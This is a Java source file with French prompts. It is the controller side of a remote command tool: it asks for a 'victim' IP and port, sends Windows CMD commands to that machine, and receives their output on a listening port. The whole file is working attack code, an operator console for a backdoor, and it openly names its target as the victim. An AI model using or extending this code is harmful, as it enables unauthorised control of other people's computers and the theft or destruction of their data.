import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class Send {

    public static void main(final String[] args) {

        final String ipAddress = getUserInput("L'addresse IP de la victime:");
        final int ipPort = Integer.parseInt(getUserInput("Numéro de port de la victime:"));

        while (true) {

            final String command = getUserInput("Commande CMD à éxécuter sur la victime:");
            final int runCount = Integer.parseInt(getUserInput("Combien de fois éxécuter la commande:"));

            try {

                for (int i = 0; i < runCount; i++) {

                    System.out.println("\033[0;33m" + "[A <-?-> V]" + "\033[0m" + " Connexion à '" + ipAddress + "' sur le port '" + ipPort + "'");
                    final Socket socket = new Socket(ipAddress, ipPort);
                    System.out.println("\033[0;32m" + "[A <-v-> V]" + "\033[0m" + " SUCCÈS! CONNEXION RÉUSSI!");

                    final Thread receiverThread = new Thread(() -> {
                        try {
                            final ServerSocket serverSocket = new ServerSocket(665);
                            final Socket clientSocket = serverSocket.accept();
                            final InputStream inputStream = clientSocket.getInputStream();
                            final DataInputStream dataInputStream = new DataInputStream(inputStream);

                            System.out.println(dataInputStream.readUTF());

                            dataInputStream.close();
                            inputStream.close();

                            clientSocket.close();
                            serverSocket.close();
                        } catch (final IOException ignored) {}
                    });

                    receiverThread.start();

                    final OutputStream outputStream = socket.getOutputStream();
                    final DataOutputStream dataOutputStream = new DataOutputStream(outputStream);

                    System.out.println("\033[0;33m" + "[A <-?-> V]" + "\033[0m" + " Envoi de la commande '" + command + "'...");

                    dataOutputStream.writeUTF(command);
                    dataOutputStream.flush();
                    outputStream.flush();
                    dataOutputStream.close();
                    outputStream.close();

                    System.out.println("\033[0;32m" + "[A <-v-> V]" + "\033[0m" + " SUCCÈS! COMMANDE ENVOYÉ!" + "\033[0m");
                    socket.close();

                    System.out.println("\033[0;33m" + "[A <-?-> V]" + "\033[0m" + " En attente des données ou erreurs de la commande...");
                    receiverThread.join();

                    Thread.sleep(50);
                }

            } catch (final IOException | InterruptedException ignored) {}
        }
    }

    public static String getUserInput(final String question) {
        final Scanner scannerIntID = new Scanner(System.in);
        System.out.println(question);
        return (scannerIntID.nextLine());
    }
}
